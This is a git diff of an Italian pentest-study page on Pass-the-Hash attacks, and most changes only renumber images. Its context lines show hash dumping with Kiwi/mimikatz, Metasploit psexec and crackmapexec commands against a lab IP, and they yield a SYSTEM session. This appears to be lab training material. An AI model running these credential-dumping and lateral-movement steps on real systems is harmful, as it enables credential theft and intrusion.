@@ -4,7 +4,7 @@ description: Pass-the-Hash attacks
 
 # Pass-the-Hash Attacks
 
-<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
 Se abbiamo degli hash possiamo fare dei pass-the-hash attacks.
 
@@ -23,7 +23,7 @@ set RHOSTS 10.2.28.132
 exploit
 ```
 
-<figure><img src="../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>
 
 ## Dump degli hash NTLM con Kiwi
 
@@ -38,15 +38,15 @@ lsa_dump_sum
 hashdump
 ```
 
-<figure><img src="../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>
 
 Salviamo l'hash NTLM di Administrator in un nuovo file txt assieme a quante altre credenziali vogliamo (es: student).
 
 Avremmo ottenuto lo stesso risultato degli hash NTLM con mimikatz
 
-<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>
 
 ## Effettuare un pass the hash usando il modulo MSF psexec
 
@@ -54,9 +54,9 @@ Per usare questo modulo abbiamo bisogno anche del LM hash oltre l'hash NTLM. Per
 
 Prendiamo quindi l'LM + NTLM come selezionato qui sotto, e lo incolliamo sempre nel nostro file txt.
 
-<figure><img src="../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>
 
 Mettiamo in background la sessione meterpreter (CTRL+Z) e cerchiamo il modulo psexec che ci serve (Authenticated User Code execution, per questo ci servono le credenziali o meglio l'hash).
 
@@ -72,23 +72,23 @@ set target Native\ upload
 exploit
 ```
 
-<figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>
 
 L'exploit ha fallito perché non abbiamo impostato un target, e impostiamo in questo caso il target Command
 
-<figure><img src="../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>
 
 Ancora non otteniamo una sessione, ma probabilmente dobbiamo configurare un target, proviamo con una Native\ upload per fare l'upload del meterpreter payload.
 
-<figure><img src="../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (676).png" alt=""><figcaption></figcaption></figure>
 
 Come possiamo vedere ha fatto l'autenticazione con l'utente Administrator, ha caricato il payload ed ha aperto la sessione. Effettivamente la sessione è stata aperta come administrator (NT AUTHORITY\SYSTEM) e tutto questo lo abbiamo fatto con un hash trovato relativamente facilmente.
 
@@ -116,9 +116,9 @@ crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM Hash> -x "net user admini
 crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM Hash> -x "net user" //per elencare gli utenti
 ```
 
-<figure><img src="../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>
 
